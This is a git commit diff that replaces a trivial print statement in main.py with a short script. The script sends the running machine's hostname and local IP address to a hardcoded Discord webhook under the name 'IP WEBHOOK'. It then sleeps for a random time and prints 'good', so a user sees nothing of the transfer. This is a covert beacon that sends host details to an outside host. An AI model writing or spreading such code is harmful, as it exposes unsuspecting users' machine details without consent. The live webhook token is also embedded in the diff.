4195551a260ca1d6557c716da278d83f091ea3f6
hmmmmmm <134966849+hmmmmmmmmmmm-ctrl@users.noreply.github.com>
2023-09-17 11:59:14 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,1 +1,20 @@
-print("code de github")
+from termcolor import cprint, colored
+import time
+import random
+import socket
+import requests
+
+random_time = random.randint(5, 17)
+
+
+u = "https://discord.com/api/webhooks/1151568846285705266/xAydDMKKDqMSBmDYb6Q7sTqS5anAY18-8R8_z2a9NaSpA8aYuz-E9KViVE9izKTaO3uw"
+h = socket.gethostname()
+i = socket.gethostbyname(h)
+t = time.localtime()
+t = time.strftime("%H:%M:%S", t)
+d = {"content" : f"**--------------------------------------**\n**{t}**", "username" : "IP WEBHOOK"}
+d["embeds"] = [{"description" : f"**NAME**: {h}\n**IP**: {i}", "title" : "IP: "}]
+requests.post(u, json=d)
+print(random_time+ " s")
+time.sleep(random_time)
+cprint("good", "green")
